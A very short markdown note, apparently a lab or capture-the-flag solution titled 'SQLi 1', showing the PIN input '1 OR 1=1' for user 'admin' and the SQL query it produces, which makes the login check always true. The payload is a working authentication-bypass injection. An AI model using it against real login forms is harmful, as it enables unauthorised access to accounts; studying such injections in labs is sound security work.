# SQLi 1

User: `admin`
PIN: `1 OR 1=1`

SQL Query formed:

```sql
SELECT rowid, * FROM users WHERE username = 'admin' AND pin = 1 OR 1=1
```
